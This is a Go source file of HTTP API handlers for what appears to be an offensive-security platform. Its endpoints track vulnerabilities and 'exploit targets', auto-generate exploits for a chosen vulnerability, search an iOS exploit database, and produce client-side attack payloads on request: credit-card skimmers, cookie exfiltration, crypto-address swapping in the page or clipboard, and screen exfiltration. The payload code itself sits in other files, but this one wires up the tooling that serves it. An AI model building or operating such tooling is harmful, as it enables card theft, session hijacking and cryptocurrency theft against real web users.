package server

import (
	"encoding/json"
	"log"
	"net/http"
	"strconv"
	"time"

	"github.com/Autumn-27/artex/agent/payloads"
	"github.com/Autumn-27/artex/agent/research"
	"github.com/Autumn-27/artex/server/patchmonitor"
)

// ---------- Patch Monitor API Handlers ----------

func (s *Server) handlePatchMonitorSources(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}

	sources, err := s.patchMon.GetAllSources()
	if err != nil {
		http.Error(w, "failed to get sources", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(sources)
}

func (s *Server) handlePatchMonitorVulns(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}

	q := r.URL.Query()
	status := q.Get("status")
	limit, _ := strconv.Atoi(q.Get("limit"))
	if limit <= 0 || limit > 100 {
		limit = 50
	}

	vulns, err := s.patchMon.GetVulnerabilities( status, limit)
	if err != nil {
		http.Error(w, "failed to get vulnerabilities", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(vulns)
}

func (s *Server) handlePatchMonitorTargets(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}

	targets, err := s.patchMon.GetTargets()
	if err != nil {
		http.Error(w, "failed to get targets", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(targets)
}

func (s *Server) handlePatchMonitorAddTarget(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}

	var target patchmonitor.ExploitTarget
	if err := json.NewDecoder(r.Body).Decode(&target); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}

	id, err := s.patchMon.AddTarget(target)
	if err != nil {
		http.Error(w, "failed to add target: "+err.Error(), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]interface{}{"id": id})
}

func (s *Server) handlePatchMonitorDeleteTarget(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}
	id, err := strconv.ParseInt(r.PathValue("id"), 10, 64)
	if err != nil || id <= 0 {
		http.Error(w, "invalid target id", http.StatusBadRequest)
		return
	}
	if err := s.patchMon.DeleteTarget(id); err != nil {
		http.Error(w, "failed to delete target", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(map[string]string{"status": "deleted"})
}

func (s *Server) handlePatchMonitorGenerateExploit(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}
	var req struct {
		VulnID int64 `json:"vuln_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.VulnID <= 0 {
		http.Error(w, "invalid vuln_id", http.StatusBadRequest)
		return
	}
	gen := patchmonitor.NewExploitGenerator(s.m.pg.DB)
	exploits, err := gen.GenerateExploitsForVuln(req.VulnID)
	if err != nil {
		http.Error(w, "failed to generate exploit: "+err.Error(), http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(exploits)
}

// handlePatchMonitorStart starts the background monitor.
func (s *Server) handlePatchMonitorStart(w http.ResponseWriter, r *http.Request) {
	if s.patchMon.IsRunning() {
		json.NewEncoder(w).Encode(map[string]string{"status": "already_running"})
		return
	}

	s.patchMon.Start(r.Context())
	json.NewEncoder(w).Encode(map[string]string{"status": "started"})
	log.Printf("[api] Patch monitor started")
}

// handlePatchMonitorStop stops the background monitor.
func (s *Server) handlePatchMonitorStop(w http.ResponseWriter, r *http.Request) {
	s.patchMon.Stop()
	json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
	log.Printf("[api] Patch monitor stopped")
}

// handlePatchMonitorStatus returns monitor status.
func (s *Server) handlePatchMonitorStatus(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(map[string]interface{}{
		"running": s.patchMon.IsRunning(),
		"checked_at": time.Now(),
	})
}

// handleGeneratePayload generates a client-side attack payload.
func (s *Server) handleGeneratePayload(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		return
	}

	var req struct {
		Type    string          `json:"type"`    // "cc_skimmer", "cookie_exfil", "crypto_swap_dom", "crypto_swap_clipboard", "screen_exfil"
		Config  json.RawMessage `json:"config"` // Type-specific config
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}

	var payload string
	var err error

	switch req.Type {
	case "cc_skimmer":
		var cfg payloads.CCSkimmerConfig
		if len(req.Config) > 0 {
			json.Unmarshal(req.Config, &cfg)
		}
		payload, err = payloads.GenerateCCSkimmer(cfg)

	case "cookie_exfil":
		var cfg payloads.CookieExfilConfig
		if len(req.Config) > 0 {
			json.Unmarshal(req.Config, &cfg)
		}
		payload, err = payloads.GenerateCookieExfil(cfg)

	case "crypto_swap_dom":
		var cfg payloads.CryptoSwapConfig
		if len(req.Config) > 0 {
			json.Unmarshal(req.Config, &cfg)
		}
		payload, err = payloads.GenerateCryptoSwapDOM(cfg)

	case "crypto_swap_clipboard":
		var cfg payloads.CryptoSwapConfig
		if len(req.Config) > 0 {
			json.Unmarshal(req.Config, &cfg)
		}
		payload, err = payloads.GenerateClipboardHijack(cfg)

	case "screen_exfil":
		var cfg payloads.ScreenExfilConfig
		if len(req.Config) > 0 {
			json.Unmarshal(req.Config, &cfg)
		}
		payload, err = payloads.GenerateScreenExfil(cfg)

	default:
		http.Error(w, "unknown payload type: "+req.Type, http.StatusBadRequest)
		return
	}

	if err != nil {
		http.Error(w, "payload generation failed", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"type":    req.Type,
		"payload": payload,
	})
}

// handleIOSExploits queries the iOS exploits database.
func (s *Server) handleIOSExploits(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	query := q.Get("query")
	version := q.Get("ios_version")

	exploits := research.NewIOSExploitDatabase()
	results := exploits.Search(query, version)
	if results == nil {
		results = make([]research.IOSExploit, 0)
	}
	json.NewEncoder(w).Encode(results)
}
